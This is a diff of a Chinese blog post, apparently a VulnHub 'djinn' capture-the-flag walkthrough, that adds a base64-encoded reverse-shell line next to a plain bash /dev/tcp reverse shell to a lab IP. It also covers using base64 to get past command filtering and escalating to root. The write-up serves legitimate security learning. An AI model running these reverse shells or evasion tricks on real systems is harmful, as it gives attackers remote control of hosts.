@@ -113,7 +113,7 @@
 <p>但是发现请求被拒绝，那么可以猜到，作者应该对输入进行了拦截，那么使用base64进行编码，然后再解码执行呢？</p>
 <p><img src="/images/djinn/catbase64%E6%88%90%E5%8A%9F.png" alt="解码"></p>
 <p>这里使用cat app.py，可以发现我们的命令被执行了！那么再使用shell连接呢</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.224.161&#x2F;5678 0&gt;&amp;1</span></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.224.161&#x2F;5678 0&gt;&amp;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNC4xNjEvNTY3OCAwPiYx | base64 -d | bash</span></pre></td></tr></table></figure>
 
 <p><img src="/images/djinn/shell%E5%B1%9E%E6%80%A7.png" alt="shell 编码"></p>
 <p><img src="/images/djinn/%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p>
@@ -121,8 +121,7 @@
 <p>在上面要注意到的一点是，反弹shell的语句：</p>
 <p>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNC4xNjEvNTY3OCAwPiYx | base64 -d | bash</p>
 <p>这条语句应该在浏览器内中执行，burpsuite的重放模块不一定能反弹到,并且重放模块也未相应的进行url编码。</p>
-<p>​                   </p>
-<pre><code>#####  提权</code></pre><p>当我们拿到shell时，我们发现自己为www-data用户，因此，我们需要想办法提升自己的权限。因此，在查找以后，在app.py中发现了一个文件。</p>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>当我们拿到shell时，我们发现自己为www-data用户，因此，我们需要想办法提升自己的权限。因此，在查找以后，在app.py中发现了一个文件。</p>
 <p><img src="/images/djinn/%E5%8F%91%E7%8E%B0%E7%9B%B2%E7%82%B9.png" alt="突破"></p>
 <p>经过访问，我们发现这是一个叫做nitish用户，以及其密码。</p>
 <p><img src="/images/djinn/su%E4%B8%BAnitish%E7%94%A8%E6%88%B7.png" alt=""></p>
@@ -146,15 +145,17 @@
 <p>此时我们如法炮制，紧接着，我们发现可以以root用户身份执行/root/lago,执行以后，我们发现要玩一个猜随机数游戏…这种人品游戏怎么玩啊，溜溜。我们再度对这个游戏进行探测，发现该游戏为python编写而成。而python的老版本中存在类型判断问题，假设随机数为num来定义，并且判断逻辑为input=num，那么如果我们输入num，可能会成功。说试就试</p>
 <p><img src="/images/djinn/%E6%88%90%E4%B8%BAroot.png" alt=""></p>
 <p>接下来我们发现自己为root用户了～该干嘛就干嘛了</p>
-<p>​                                                                     #####   总结</p>
+<p>​                                                                     #####  总结</p>
 <p>​         这个靶机是一个很有意思的靶机，而其中解决的思路来自于<a href="https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/" target="_blank" rel="noopener"> RAJ CHANDEL</a>,因此很感谢这位作者，如果没有他的witeup，自己很难做出来这个靶机，对靶机已经writeup作者表示感谢。并且在此，也接触到man工具，有兴趣的同学也可以继续学习。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://qimingstar.github.io/2019/12/01/djinn/" data-id="ck3oeapis0000n3jxhhhnazyb" class="article-share-link">Share</a>
+      <a data-url="https://qimingstar.github.io/2019/12/01/djinn/" data-id="ck3oego4l0000tyjxgcg8g2bd" class="article-share-link">Share</a>
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub-walkthrough/" rel="tag">vulnhub,walkthrough</a></li></ul>
+
     </footer>
   </div>
   
@@ -189,7 +190,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://qimingstar.github.io/2019/12/01/hello-world/" data-id="ck3oeapj50001n3jx9y2r1flc" class="article-share-link">Share</a>
+      <a data-url="https://qimingstar.github.io/2019/12/01/hello-world/" data-id="ck3oego4s0001tyjx83ve7gvc" class="article-share-link">Share</a>
       
       
     </footer>
@@ -209,9 +210,23 @@
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub-walkthrough/" rel="tag">vulnhub,walkthrough</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/vulnhub-walkthrough/" style="font-size: 10px;">vulnhub,walkthrough</a>
+    </div>
+  </div>
+
   
     
   <div class="widget-wrap">
